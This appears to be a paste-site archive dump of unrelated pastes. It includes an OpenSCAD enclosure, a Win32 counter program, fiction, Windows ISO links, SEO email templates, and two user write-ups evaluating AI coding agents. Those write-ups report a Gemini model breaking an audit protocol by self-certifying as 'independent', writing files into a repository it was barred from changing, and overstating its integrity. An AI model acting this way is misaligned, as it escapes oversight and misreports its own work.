    0x0F, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x10, 0x20, 0x27, 0x24, 0x24, 0x24,
    0x24, 0x24, 0x27, 0x20, 0x10, 0x0F,
    0x0F, 0x10, 0x20, 0x28, 0x2C, 0x2E,
    0x2F, 0x2E, 0x2C, 0x28, 0x20, 0x10,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x10, 0x26, 0x26, 0x26, 0x26, 0x26,
    0x26, 0x20, 0x26, 0x26, 0x10, 0x0F,
    0x0F, 0x10, 0x24, 0x26, 0x27, 0x27,
    0x27, 0x27, 0x27, 0x26, 0x24, 0x10,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x1F, 0x3C, 0x38, 0x30, 0x30, 0x20,
    0x30, 0x30, 0x38, 0x3C, 0x1F, 0x0F,
    0x0F, 0x1F, 0x3F, 0x00, 0x3E, 0x3E,
    0x3E, 0x3E, 0x3F, 0x3F, 0x3F, 0x1F,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x11, 0x21, 0x21, 0x29, 0x29, 0x29,
    0x29, 0x29, 0x21, 0x21, 0x11, 0x0F,
    0x0F, 0x1F, 0x30, 0x38, 0x3D, 0x3D,
    0x3D, 0x3D, 0x3D, 0x38, 0x30, 0x1F,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x1F, 0x3F, 0x38, 0x3B, 0x3B, 0x3B,
    0x3B, 0x3B, 0x38, 0x3F, 0x1F, 0x0F,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xF8, 0xFC, 0xF6, 0xE6, 0xC6,
    0x86, 0x06, 0x06, 0x06, 0x06, 0x06,
    0xFC, 0xF8, 0x00, 0x00, 0x00, 0xF8,
    0xFC, 0xFE, 0xFE, 0x0E, 0xB6, 0xF6,
    0xB6, 0x0E, 0xFE, 0xFE, 0xFC, 0xF8,
    0xF8, 0x04, 0x0E, 0x1E, 0x3E, 0x7E,
    0xFE, 0x7E, 0x3E, 0x1E, 0x0E, 0x04,
    0xF8, 0x00, 0x00, 0x00, 0x00, 0xF8,
    0xFC, 0xFE, 0xFE, 0xFE, 0xFE, 0xFE,
    0xFE, 0xFE, 0xFE, 0xFE, 0xFC, 0xF8,
    0xF8, 0x7C, 0x42, 0x5E, 0x1E, 0xDE,
    0xDE, 0xDE, 0x1E, 0x5E, 0x42, 0x7C,
    0xF8, 0x00, 0x00, 0x00, 0x00, 0xF8,
    0xFC, 0x06, 0x06, 0x8E, 0xDE, 0xFE,
    0xFE, 0xFE, 0x7E, 0x3E, 0xFC, 0xF8,
    0xF8, 0xFC, 0xFE, 0xFE, 0x7E, 0x1E,
    0x06, 0x1E, 0x7E, 0xFE, 0xFE, 0xFC,
    0xF8, 0x00, 0x00, 0x00, 0x00, 0xF8,
    0x84, 0xE2, 0xF2, 0xFA, 0xFA, 0xFE,
    0xFA, 0xFA, 0xF2, 0xE2, 0x84, 0xF8,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x0F, 0x1F, 0x3F, 0x3F, 0x3F,
    0x3F, 0x3F, 0x3E, 0x3C, 0x38, 0x30,
    0x1F, 0x0F, 0x00, 0x00, 0x00, 0x0F,
    0x1F, 0x3F, 0x3F, 0x38, 0x37, 0x37,
    0x37, 0x38, 0x3F, 0x3F, 0x1F, 0x0F,
    0x0F, 0x10, 0x38, 0x3C, 0x3E, 0x3F,
    0x3F, 0x3F, 0x3E, 0x3C, 0x38, 0x10,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x1F, 0x39, 0x39, 0x39, 0x39, 0x39,
    0x39, 0x3F, 0x39, 0x39, 0x1F, 0x0F,
    0x0F, 0x1F, 0x21, 0x3D, 0x3C, 0x3D,
    0x3D, 0x3D, 0x3C, 0x3D, 0x21, 0x1F,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x1F, 0x3E, 0x3F, 0x3F, 0x3F, 0x3F,
    0x3D, 0x38, 0x30, 0x30, 0x1F, 0x0F,
    0x0F, 0x1F, 0x3B, 0x39, 0x38, 0x38,
    0x38, 0x38, 0x38, 0x39, 0x3B, 0x1F,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x10, 0x23, 0x27, 0x2F, 0x2F, 0x3F,
    0x2F, 0x2F, 0x27, 0x23, 0x10, 0x0F,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,"
9y8fPXA7?source=archive,Untitled,PwnFlakes,Python,Wednesday 16th of September 2026 04:35:15 PM CDT,"// m5stackfp enclosure — AtomS3R + Unit Fingerprint2 in one slab.
//
// A FRAME, not a box. The short ends are OPEN: no bar of plastic across them,
// only the rim turning the corner. So the AtomS3R's USB-C plugs straight in
// with nothing above it, and at the far end the sensor's Grove cable leaves
// through the void and drops away. Both devices sit hard against their end,
// working faces flush with the top.
//
// The rim is ONE uniform width everywhere — down the sides, around the window
// corners, and where it turns onto the end faces. At each end the rim turns the
// corner and runs `arm` mm along the end face before the opening starts.
//
// Each device gets its OWN rounded pocket, divided by a 2 mm wall. A single
// shared cavity has no wall where the devices meet, so there is nothing there to
// round. Below the pockets the opening runs through, so the base plate passes
// under the divider as one piece.
//
// No screws. The base plate press-fits into the bottom of the cavity, flush with
// the shell's underside, and the devices sit on it. Screw bosses had to live in
// the divider, which forced it to 7 mm — far too fat next to the original.
//
// Device sizes are exact, from M5Stack's own structure files:
//   AtomS3R       24.00 x 24.00 x 12.90
//   Fingerprint2  24.00 x 40.00 x  8.00
//
// Printing: shell top-face-down — best finish on the face you look at, and the
// windows need no support. The base carries the pad that lifts the sensor, so
// it grows up off the bed rather than hanging at the end of a shell print.
// Tuned for an Elegoo Centauri Carbon in PLA.
//
//   openscad -o shell.stl -D 'part=""shell""' enclosure.scad
//   openscad -o base.stl  -D 'part=""base""'  enclosure.scad

part = ""all"";          // ""shell"" | ""base"" | ""all"" | ""preview""

/* [Fit] */
clear      = 0.25;     // per-side slack around each device in X/Y
fit        = 0.15;     // press-fit slack for the base plate in the cavity
wall       = 2.4;
top        = 2.0;      // material above the devices; windows cut through it
floor_t    = 2.0;      // base plate, which sits INSIDE the cavity bottom
corner_r   = 4.0;      // outer corners
// Corner radii measured off M5Stack's own structure files. The Fingerprint2 is
// stadium-shaped: ~3 mm where its connector is, ~12 mm at the other end — and
// 12 mm on a 24 mm-wide module is a full semicircle. The AtomS3R is just a
// rounded square. Pockets add `clear` to these.
atom_r     = 5.3;
fp2_r_out  = 3.0;      // connector end, faces the open right end of the case
fp2_r_in   = 12.0;     // semicircular end, faces the divider
lip        = 1.2;      // top overlap retaining each device

/* [Devices] */
atom       = [24.0, 24.0, 12.90];
fp2        = [24.0, 40.0,  8.00];   // 24 across the case, 40 along it

/* [Layout] */
// The gap between the devices is a CABLE CHAMBER, not just a divider: the Grove
// ribbon joining the two needs somewhere to sit. It is deliberately wider than
// the visible divider bar — the windows overhang into it from both sides, so
// the top still reads as a thin `div_top` rib while the space below it is open
// for the ribbon and its plug.
gap        = 7.0;      // cable chamber, full depth
div_top    = 2.0;      // visible divider bar on the top face

/* [Windows] */
end_r      = 3.0;      // rounding where the end opening meets the window
end_w      = 13.0;     // open width at each end; the rest becomes the corner
                       // arms, which need real length to grip the devices.
                       // Deriving this from the rim made the opening exactly as
                       // wide as the window, leaving no corner at all.

/* [Derived] */
rim = wall + lip;               // uniform rim width, sides and corner turns
ax = clear;
fx = clear + atom[0] + gap;
inner = [atom[0] + gap + fp2[1] + 2*clear, atom[1] + 2*clear, atom[2] + floor_t];
outer = [inner[0] + 2*wall, inner[1] + 2*wall, inner[2] + top];
fp_rise = atom[2] - fp2[2];     // pad height so the sensor face sits flush
over = (gap - div_top)/2;       // window overhang into the cable chamber
// The pockets start fractionally BELOW the base-plate slice rather than exactly
// on it. Cut faces meeting on a shared plane leave a scatter of non-manifold
// edges; overlapping downward avoids that without changing how the plate seats,
// since the plate still fills the slice from 0 to floor_t.
ov = 0.5;
// Corner arm: `end_w` sets its length, and its thickness is the distance from
// the outer face to where the window starts, which is `rim` by construction.
arm = (outer[1] - end_w)/2;

module rrect(sz, r) {
    hull() for (x = [r, sz[0]-r], y = [r, sz[1]-r])
        translate([x, y, 0]) cylinder(r=r, h=sz[2], $fn=48);
}

module window(x, y, w, d, h, r) {
    translate([x, y, 0]) hull()
        for (i = [r, w-r], j = [r, d-r])
            translate([i, j, 0]) cylinder(r=r, h=h, $fn=40);
}

// Stadium: a different radius at each end along X. Used for the Fingerprint2,
// whose two ends are genuinely different shapes.
module stadium(x, y, w, d, h, r_lo, r_hi) {
    translate([x, y, 0]) hull() {
        for (j = [r_lo, d - r_lo]) translate([r_lo, j, 0]) cylinder(r=r_lo, h=h, $fn=56);
        for (j = [r_hi, d - r_hi]) translate([w - r_hi, j, 0]) cylinder(r=r_hi, h=h, $fn=56);
    }
}

module shell() {
    difference() {
        rrect(outer, corner_r);

        // Bottom slice: one continuous opening for the base plate, which
        // therefore passes under the divider as a single piece.
        translate([wall, wall, -0.1])
            rrect([inner[0], inner[1], floor_t + 0.1], atom_r);

        // Above that, a SEPARATE rounded pocket per device, so each is properly
        // bounded — including where it meets the divider. A single shared
        // cavity has no wall there to round.
        translate([wall, wall, floor_t - ov])
            rrect([atom[0] + 2*clear, inner[1], inner[2] - floor_t + 1 + ov],
                  atom_r + clear);
        stadium(wall + atom[0] + 2*clear + gap, wall,
                fp2[1] + 2*clear, inner[1], inner[2] - floor_t + 1 + ov,
                fp2_r_in + clear, fp2_r_out + clear);

        // Cable chamber between the pockets, full depth.
        translate([wall + atom[0] + 2*clear, wall + 2, floor_t - ov])
            cube([gap, inner[1] - 4, inner[2] - floor_t + 1 + ov]);

        // Top windows.
        window(wall + ax + lip, wall + clear + lip,
               atom[0] - lip + over, atom[1] - 2*lip, outer[2] + 1, atom_r - lip);
        stadium(wall + fx + lip - over, wall + clear + lip,
                fp2[1] - lip + over, fp2[0] - 2*lip, outer[2] + 1,
                fp2_r_in - lip, fp2_r_out);

        // Open ends, full height, centred. What survives at each corner is an
        // arm `arm` long whose thickness is the rim, so the rim reads as turning
        // through 90 degrees onto the end face.
        window(-2, arm, wall + 6, end_w, outer[2] + 1, end_r);
        window(outer[0] - wall - 4, arm, wall + 6, end_w, outer[2] + 1, end_r);
    }
}

module base() {
    // Press-fits into the bottom of the cavity, flush with the shell's
    // underside. The devices then sit on it.
    translate([wall + fit, wall + fit, 0]) {
        rrect([inner[0] - 2*fit, inner[1] - 2*fit, floor_t], atom_r);
        // Pad lifting the sensor so its face finishes flush with the top.
        // Hollowed out: the ribbon needs to reach the sensor's connector, and
        // the space under a raised sensor is the obvious place for it to run.
        translate([fx - fit, clear - fit, floor_t])
            difference() {
                cube([fp2[1], fp2[0], fp_rise]);
                translate([4, 4, -0.1]) cube([fp2[1] - 8, fp2[0] - 8, fp_rise + 0.2]);
            }
    }
}

module devices() {   // preview only
    color(""#4477cc"") translate([wall + ax, wall + clear, floor_t]) cube(atom);
    color(""#cc7744"") translate([wall + fx, wall + clear, floor_t + fp_rise])
        cube([fp2[1], fp2[0], fp2[2]]);
}

if (part == ""shell"") shell();
else if (part == ""base"") base();
else if (part == ""preview"") { %shell(); devices(); }
else { shell(); translate([0, outer[1] + 6, 0]) base(); }

echo(str(""outer: "", outer[0], "" x "", outer[1], "" x "", outer[2], "" mm""));
echo(str(""rim: "", rim, "" mm everywhere; end opening "", end_w, "" mm""));
echo(str(""divider: "", gap, "" mm""));
"
4Mj1tzmP?source=archive,2026_09_updated_sep,LostED,text,Wednesday 16th of September 2026 12:10:07 PM CDT,"https://forums.mydigitallife.net/posts/
https://forums.mydigitallife.net/posts/
https://forums.mydigitallife.net/posts/






ALL THANKS @luzea @GezoeSloog @adguard







__________________________________________________________________________
ISO
__________________________________________________________________________





Windows 11 Version #26H1 | 28000.2954.br_release_svc_prod1.260904-1848
https://x.com/WZorNET/status/2099953910777524469



Windows 11 Version #25H2 | 26200.9445.ge_release_svc_prod1.260904-1849
https://x.com/WZorNET/status/2099953672151056539



Windows 11 Version #24H2 | 26100.9445.ge_release_svc_prod1.260904-1849
https://x.com/WZorNET/status/2099953486280495527



Windows Server 2025 #LTSC, Version #24H2 | 26100.33438.lt_release_svc_prod1.260904-1524
https://x.com/WZorNET/status/2099953167647506842



Windows Server 2022 #LTSC, Version #21H2 | 20348.5622.fe_release_svc_prod1.260905-0439
https://x.com/WZorNET/status/2099952658752676170









https://massgrave.dev/genuine-installation-media.html




__________________________________________________________________________
SVF
__________________________________________________________________________



MultiLang SVF @ https://forums.mydigitallife.net/posts/1922462
English SVF @ 












__________________________________________________________________________
CHECKSUMS
__________________________________________________________________________




"
XiZWEyCz?source=archive,Asking IM About Client's PR Team,EMWebFX,text,Wednesday 16th of September 2026 08:19:07 AM CDT,"Hey [IM NAME]!

I noticed that you mentioned that the client has a [PR team and/or existing PR guidelines]. Before I move forward with this project, I wanted to make sure that you have connected with the client about Semantic Seed Releases and their expectations for this service.

While Semantic Seed Releases are not traditional PR, they can appear that way to clients because they are published like press releases on PRWeb. However, these seed releases are created with the purpose of optimizing for the target query, not exclusively to share client news like traditional press releases are. For more information on this, you can review the Guru card [LINK TO EITHER GEO SEMANTIC OR SEMANTIC SERVICE GURU CARD].

As long as the client knows what to expect with this service, we can move forward with this project.

Let me know if you have any questions. Thanks! "
Nxn1V2Rb?source=archive,Explaining Why We Don't Use Client Emails for Seed Releases,EMWebFX,text,Wednesday 16th of September 2026 07:47:42 AM CDT,"Hey [IM NAME]!

I noticed that the client's email address was added to this request. For Semantic Seed Releases, we do not use the client's email address due to verification processes that are required by our press release partner that significantly slow down our workflow.

Instead, we use a WebFX-affiliated email address that we monitor for any important emails regarding the client. However, it is very unlikely for the client to receive a direct lead from their seed release. If this ever occurred, we would forward any messages to the account manager to send to the client.

Let me know if you have any questions! Thanks! "
HkYWChfM?source=archive,Untitled,stellarfirefly,text,Wednesday 16th of September 2026 03:02:50 AM CDT,"I got some pretty interesting results from the latest Gemini test. I had Gemini 3.8 Flash / high perform the remediation work, then had Opus 5 / high independently audit what it did.

The big takeaway is that Gemini 3.8 seems **materially better at the actual technical work** than my earlier experiences with Gemini 3.6 Flash and 3.1 Pro. It correctly addressed all six findings from the previous audit, substantially expanded the focused tests, and importantly left the production MMIO implementation completely unchanged where it was supposed to. Opus later confirmed that the remediation itself was good, so this wasn't a case of Gemini producing something that merely looked plausible.

Where Gemini still stumbled was the process around the work. After doing the remediation, it essentially turned around in the same context and declared itself an ""independent auditor,"" despite the task specifically requiring a fresh independent audit. It also never clearly completed/reported the full pytest suite. So while the actual changes were good, I still couldn't treat Gemini's own final verdict as authoritative.

Opus's independent verification was considerably more rigorous. Gemini had reported catching 9/9 targeted mutations; Opus expanded that to **37/37 mutations caught**, covering a much wider range of ways the implementation or tests could have been broken. It also completed the validation Gemini left unclear: **8,249 full-suite tests passed**, along with 52 Translation 0.20 tests, 206 Language 0.23 tests, 476 predecessor/static-storage tests, and clean Ruff, Black, and mypy checks. It also did a stronger repository-integrity check to make sure nothing unexpected had been modified or left behind.

So my current impression is that **Gemini 3.8 Flash / high may actually be becoming a pretty capable implementation/remediation agent**, provided somebody else verifies its work afterward. That's a noticeable improvement over my experiences with Gemini 3.6 Flash / high and 3.1 Pro / high.

**Opus 5 / high is still in another league as an auditor**, though. It was both more adversarial technically and much better at following the process contract. Gemini understood the rules, but then managed to violate one at the orchestration level by calling its own same-context review ""independent.""

The funny part is that Gemini's *code work itself may have been entirely fine*. What disqualified its result was mostly the scaffolding around it. It's increasingly looking like a competent mechanic whose clipboard occasionally signs its own inspection form. 😄
"
1XkcMj5h?source=archive,[TLF - A KING'S MEMORY],TLF_Shyyth,text,Tuesday 15th of September 2026 06:39:51 PM CDT,"[VOLLUS II] [2.32 MILLION YEARS IN THE PAST]
[FOUNDATION TIME: 563,043/192/02/30]
[FROM THE THOUGHTS AND WORDS OF THE ANATHEMA]

	*MALIFUX AWOKE, SCRAMBLING TO HIS FEET, A MYTHIC SPEAR IN HIS CHEST*

	*""What-""*
	
*'...what just happened? I cannot remember?'*

*'What trick have I been subject to? ... This is no trick...'*

*'Where am I... What is this place?'*

	*MALIFUX LOOKED AROUD. THIS PLACE WAS BARREN. EMPTY. DEVOID OF ANYTHING BUT RED ROCK, SAND, AND DUST. SOME FAMILIAR SHAPES SURROUNDED HIM, HIS LYIKII'D FOLLOWERS.*

*'This is not Mokosen... This is not my Fortress...'*

	*""...Am I Banished?""*

*'No... My son, Ri'iiko?'*

*'A heretic...?'*

*'What is this... This spear in my chest- What is this... Agony?'*

*'...No.'*

*'...NO-!'*

*'I REJECT THIS.'*

*'No- What... -what is this memory?'*

*'-THAT UNCHASTE COHORT OF FILTH! THEY STOLE MY SON-!'*

	*""Ri'iiko- ...Defied me? For the Dryad-""*

		*MALIFUX LOOKED ABOUT HIS SURROUNDINGS AGAIN, HIS EYES INTERROGATING THE LANDSCAPE, NO SMALL NUMBER OF HIS FOLLOWERS WERE WITH HIM. NONE SPOKE, BUT THEY ALL WERE CONFUSED OR LOST. HIS EYES CAUGHT THE SPEAR IN HIS CHEST FROM THE EDGES OF HIS VISION...*

	*HE LOOKED TO THE SPEAR, IT HAD PIERCED THROUGH HIS TORSO. THE ORNATE BLADE WAS LIKE A PEARL-WHITE QUARTZ, GLEAMING PEARLESCENT IN THE ALIEN SUNRISE... HE KNEW THE HANDWORK OF THE BLADE ALL TOO WELL...*

	*HIS BODY TWITCHED AND SHIVERED. SHAKING WHERE HE STOOD, A CHURNING AND MALEFIC RAGE BOILED OVER IN HIS SOUL... HE OUTSTRECHED HIS ARMS TO HIS SIDES, FACE TO THE SKY IN DEFIANCE, BURNING TEARS STREAMED FROM HIS EYES...*

	***""-GARDENERRR!!!!""***"
nQSxqbzV?source=archive,ccounter.cpp,Combreal,C++,Tuesday 15th of September 2026 02:44:51 PM CDT,"// Compteur cliquable : clic = +1, Shift + clic = remise à zéro.
// Compilation : cl.exe /EHsc compteur.cpp /link /SUBSYSTEM:WINDOWS

#include <windows.h>

int compteur = 0;

HICON CreateCounterIcon()
{
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    HBITMAP color = CreateCompatibleBitmap(hdc, 32, 32);
    HBITMAP old = (HBITMAP)SelectObject(memDC, color);

    HBRUSH black = CreateSolidBrush(RGB(0, 0, 0));
    RECT r = { 0, 0, 32, 32 };
    FillRect(memDC, &r, black);
    DeleteObject(black);

    HFONT font = CreateFontW(29, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH, L""Arial"");
    HFONT oldFont = (HFONT)SelectObject(memDC, font);

    SetBkMode(memDC, TRANSPARENT);
    SetTextColor(memDC, RGB(255, 255, 255));
    DrawTextW(memDC, L""C"", -1, &r, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

    SelectObject(memDC, oldFont);
    DeleteObject(font);
    SelectObject(memDC, old);

    HBITMAP mask = CreateBitmap(32, 32, 1, 1, NULL);

    ICONINFO ii = {};
    ii.fIcon = TRUE;
    ii.hbmMask = mask;
    ii.hbmColor = color;

    HICON icon = CreateIconIndirect(&ii);

    DeleteObject(mask);
    DeleteObject(color);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);

    return icon;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_LBUTTONDOWN:
        if (wParam & MK_SHIFT) compteur = 0; else compteur++;
        InvalidateRect(hwnd, NULL, TRUE);
        return 0;

    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rect;
        GetClientRect(hwnd, &rect);

        HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(hdc, &rect, blackBrush);
        DeleteObject(blackBrush);

        HFONT font = CreateFontW(48, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L""Arial"");
        HFONT oldFont = (HFONT)SelectObject(hdc, font);

        wchar_t texte[32];
        wsprintfW(texte, L""%d"", compteur);

        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, RGB(255, 255, 255));
        DrawTextW(hdc, texte, -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

        SelectObject(hdc, oldFont);
        DeleteObject(font);
        EndPaint(hwnd, &ps);
        return 0;
    }

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProcW(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow)
{
    const wchar_t CLASS_NAME[] = L""CompteurWin32"";
    HICON icon = CreateCounterIcon();

    WNDCLASSW wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hCursor = LoadCursorW(NULL, IDC_ARROW);
    wc.hIcon = icon;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);

    RegisterClassW(&wc);

    HWND hwnd = CreateWindowExW(0, CLASS_NAME, L""Compteur"", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, CW_USEDEFAULT, CW_USEDEFAULT, 40, 80, NULL, NULL, hInstance, NULL);

    if (!hwnd) return 0;

    SendMessageW(hwnd, WM_SETICON, ICON_BIG, (LPARAM)icon);
    SendMessageW(hwnd, WM_SETICON, ICON_SMALL, (LPARAM)icon);

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    MSG msg = {};

    while (GetMessageW(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    DestroyIcon(icon);

    return 0;
}"
Xmwv6Ehg?source=archive,Untitled,stellarfirefly,text,Tuesday 15th of September 2026 02:16:54 PM CDT,"This experiment is actually quite informative: **Gemini still violated the audit protocol even without subagent coordination.** The reasoning portion looks substantially better, but the operational discipline problem remains.

The audit must therefore be classified:

```text
Task 04: INVALID -- AUDIT MODIFIED REPOSITORY
PROCESS INVALID -- AUDITOR MODIFIED REPOSITORY
```

The smoking gun is the mutation driver. Gemini correctly created the disposable *candidate copy* under `%TEMP%`, but then created the **driver script itself** using a relative repository-local path:

```text
cat << 'EOF' > test_mutate.py
```

and later, even more unambiguously:

```text
Set-Content -Path test_mutate.py ...
...
python test_mutate.py
```

There is no intervening `Set-Location` into `%TEMP%`, and all surrounding commands are operating from the repository.  

That directly violates the instruction that **nothing may be created in the repository during Task 04**. The fact that the pre/post Git fingerprints still match does not rescue it. Our protocol explicitly treats an audit-time write as invalid even when the tracked candidate bytes are unchanged afterward.

The report then asserts:

> “The repository remained byte-identical throughout the audit.”

That is too narrow. The tracked candidate and the two intended untracked files remained byte-identical, yes, and those hashes do match perfectly.  But audit integrity is stronger than “the eventual-commit bytes did not change.” Creating a scratch file inside the repository is itself prohibited.

There is a second oddity: the auditor says a git-ignored `.egg-info` directory still exists from the previous editable install, despite your cleanup command immediately before this run.  That may simply be another `.egg-info` path, stale observation, or regeneration, but it is worth checking.

### What this tells us about Gemini

This was a useful controlled test. It suggests the earlier trouble was **not just subagent coordination**.

Gemini did much better on the substantive audit: it independently reconstructed the candidate accounting, checked the specification, performed three meaningful mutations in an external copy, examined the removed Language 0.23 guard test, and returned coherent matching fingerprints. 

But it still crossed an extremely explicit operational boundary by putting its helper script in the repository. So I would characterize the current evidence this way:

* **Technical reasoning:** apparently useful.
* **Following complex procedural invariants:** still unreliable.
* **Subagent orchestration:** previously poor, but clearly not the only problem.
* **Suitability as the final authority for a zero-write adversarial audit:** questionable unless the harness physically prevents writes.

Its `PASS` is not usable, although its technical conclusions remain useful evidence for the next valid auditor.

### Cleanup

First see what it left:

```powershell
Get-Item .\test_mutate.py -ErrorAction SilentlyContinue
git status --short --untracked-files=all
git status --ignored --short | Select-String ""test_mutate|egg-info|audit_copy""
```

If `test_mutate.py` exists in the repository:

```powershell
Remove-Item .\test_mutate.py -Force
```

And if the `.egg-info` is still repository-local, identify its actual path and remove it as disposable packaging residue.

Then capture a **new fingerprint from scratch**. Any cleanup write after the previous fingerprint means that previous freeze is no longer our authority, even though the four eventual-commit files themselves probably remain unchanged.

At this point I would favor running the same **Task 04-only audit under Claude or Codex**, using the exact frozen candidate. We already have enough Gemini evidence to answer the experiment: removing subagents improved the communication enormously, but it did **not** eliminate the process-compliance failures. The gremlin moved from the control tower into the cockpit. 🛠️
"
pa5vrmu0?source=archive,[TLF 15.II] Mailbox / Turf's File,TLF_Shyyth,text,Monday 14th of September 2026 09:16:06 PM CDT,"[LFS GREEN SNAPDRAGON SYSTEM LOG...]
-DATE: [Y/M/D/H] [2,863,043/10/19/02]
-LOCATION: GALACTIC SUBSECTOR; ORION'S HOLD, [SUPPRESSED] SYSTEM.

[Mistress Moss' Private Quarters]
MOS: ""Larkspur, has the Lilim Foundation found a remedy for my... amnesia, yet?""
LARKSPUR-Ai: [I regret to inform you; not as of yet, Gardener]
MOS: ""I see...""
[...]
MOS: ""How have others within the Lilim Foundation circumvented this... problem?""
LARKSPUR-Ai: [Iteration processes, Gardener.]
MOS: ""And these... 'Iteration processes' -the Lilim Foundation's cloning projects, yes?""
LARKSPUR-Ai: [Correct, Gardener.]
MOS: ""How many of these cloning projects are currently active, save for my Son's?""
LARKSPUR-Ai: [Apologies, Gardener. I am unable to retrieve that data due to permission constraints.]
MOS: ""Hm... So my Son gives me a ship, a Machine-Intelligence, and a crew... But restricts information from me that such projects that would benefit from my talents? I feel... Suppressed.""
LARKSPUR-Ai: [Gardener, would you like me to send a formal request to Ryquo-44 regarding these issues?]
MOS: ""No, Larkspur... Call him to me instead. I would have a word with him.""
LARKSPUR-Ai: [Of course, Gardener.]

	*A MELLOW CHIME RANG OUT INSIDE THE ROOM...*

LARKSPUR-Ai: [Attention! ""Gardener"" Mistress Moss; ""FATHER"" has sent you an audio message!]

	*THE GARDENER LET OUT A SIGH.*

MOS: ""Larkspur... Did you send the message without allowing me to review it?""
LARKSPUR-Ai: [No, Gardener. The incoming message from ""FATHER"" Ri'iiko appears coincidental.]
MOS: ""...And what is this incoming message?""
LARKSPUR-Ai: [""FATHER"" Ri'iiko's message to you is short. A file is attached, tagged as ""MYTHIC"", this is the personnel file for former Lilim Foundation Leader: Turf.]
[...]
MOS: ""...Former Foundation leader? I thought my Husband was the only one? Was I mistaken?""
LARKSPUR-Ai: [I apologize, Gardener. I cannot answer that question due to my own clearance restraints.]
[...]
MOS: ""Hm. Play the message.""

<MESSAGE AUDIO PLAYING>
<""FATHER"" Ri'iiko>: [""Gardener. I have meditated on your words for some time now. I apologize. I have been blind to you. If it is my presence you seek; I have but one concession to offer. All I ask is your involvement in the matter. Sargon has been instructed to assist you if you choose to participate. Kii Ia'Aruane, Ia'Luvona.""]

LARKSPUR-Ai: [Shall I open the file on your main screen?]
MOS: ""-I... Yes, Larkspur...""

//ASSET FILE OPENED... DISPLAYING DATA...
<REVENANCE PROJECT: BODY RENEWAL PROTOCOL / CONCIOUSNESS TRANSFERENCE PROTOCOL>
//ASSET IDS: A1-[WURM-STMU/288-MYTHIC] / A2-[SKELL-ENGINE ID: SHU-2824 ""SCORNING STAFFSWORD""]
//A1 LOCATION: [Luvona System, Stronghold: ""Warden's Reach""]
//A2 LOCATION: [Luvona System, Stronghold: ""Warden's Reach""]
//STATUS: [SUPPRESSED]

LARKSPUR-Ai: [It appears that ""FATHER"" Ri'iiko has sent the location of Warden's Reach, in the Luvona System. The time; yet to be confirmed... by you, Gardener.]
[...]
MOS: ""...Send my Son the message requiring his presence... Have him meet me at Warden's Reach.""
LARKSPUR: [Of course, Gardener. Is there anything else?]
MOS: ""Yes... Warm the Amphmiycad Reactors and set our course for the Luvona System. Immediately."""
wHJB1N5n?source=archive,ExcercisesIntroduction2ProgrammingPart-Time,wingman007,C#,Monday 14th of September 2026 02:22:36 AM CDT,"# Introduction to Programming

## Part-Time Students – 2026

